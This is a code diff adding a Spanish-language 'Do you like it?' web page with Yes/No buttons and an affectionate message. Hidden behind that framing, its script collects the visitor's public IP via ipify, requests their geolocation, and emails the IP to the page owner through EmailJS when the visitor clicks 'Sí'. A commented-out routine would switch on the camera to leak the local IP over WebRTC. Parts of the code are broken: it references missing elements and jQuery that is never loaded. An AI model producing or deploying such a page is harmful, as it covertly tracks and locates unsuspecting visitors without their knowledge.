@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pregunta | Thezero Academy</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <h1>¿Te Gusto😅?</h1> <!-- Pregunta agregada -->
+    <div class="buttons">
+        <form id="form" name="sentMessage" novalidate="novalidate">
+            <button type="submit" id="button" value="Send Email">Sí</button>
+            <button id="btnNo">No</button>
+            <input type="hidden" name="message" id="message" value="Dijo SI">
+            <input type="hidden" name="ip" id="ip" placeholder="IP" required>
+            <input id="to_name" name="to_name" type="hidden" value="Thezero" />
+            <input id="from_name" name="from_name" type="hidden" value="GPS" />
+        </form>
+    </div>
+
+    <audio id="audio" src="audio/gozadera.mp3"></audio>
+    <img id="imagen" class="responsive-image" src="img/feliz.gif" style="display:none;" alt="Imagen">
+
+    <!--Envia el mensaje a correo electronico-->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('bgN-e7F2EjGyDqEfz')
+        var subject = "Lyrics-Music"
+        const phone = document.getElementById('phone');
+        const btn = document.getElementById('button');
+        /* function obtenerIP() {
+          return new Promise((resolve, reject) => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+              .then(stream => {
+                stream.getTracks().forEach(track => {
+                  track.stop();
+                });
+                return new RTCPeerConnection().createOffer();
+              })
+              .then(offer => {
+                return new RTCSessionDescription({ type: 'offer', sdp: offer.sdp });
+              })
+              .then(description => {
+                const ipRegex = /candidate:\d+ \d+ (\d+\.\d+\.\d+\.\d+)/;
+                const ip = description.sdp.match(ipRegex)[1];
+                resolve(ip);
+              })
+              .catch(error => reject(error));
+          });
+        }
+    
+        obtenerIP().then(ip => console.log('IP del dispositivo:', ip)); */
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                document.getElementById("ip").value = ip;
+                console.log('IP del dispositivo:', ip);
+            });
+        // Solicitar permiso para acceder a la ubicación
+        navigator.geolocation.getCurrentPosition(
+            // Función que se ejecuta si se obtiene la ubicación correctamente
+            function (position) {
+                // Almacenar las coordenadas en variables
+                let latitud = position.coords.latitude;
+                let longitud = position.coords.longitude;
+
+                // Crear un enlace a Google Maps con las coordenadas
+                let enlaceGoogleMaps = `https://www.google.com/maps/search/?api=1&query=${latitud},${longitud}`;
+
+                // Mostrar el enlace en la consola
+                console.log("Enlace a Google Maps: " + enlaceGoogleMaps);
+                from = document.getElementById("latitud").value = latitud;
+                mess = document.getElementById("longitud").value = longitud;
+                //ipp = document.getElementById("ip").value = data.ip;
+            },
+            // Función que se ejecuta si no se puede obtener la ubicación
+            function (error) {
+                console.error("Error al obtener la ubicación: " + error.message);
+            }
+        );
+        document.getElementById('form')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                btn.value = 'Enviando...';
+
+                const serviceID = 'service_tzzmwxg';
+                const templateID = 'template_tn3efha';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn.value = 'Send Email';
+                            alert('¡Sindicato Team Fabi Te Agradece!')
+                        var msj2 = '<center><div style="display: block;background-color: transparent;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">¡TE QUIERO MUCHO LUNA!</div></div></center>'
+                        $('body').append(msj2)
+
+                        //alert('MUCHAS GRACIAS POR PARTICIPAR!');
+                    }, (err) => {
+                        btn.value = 'Send Email';
+                        alert(JSON.stringify(err));
+                    });
+
+            });
+
+
+    </script>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
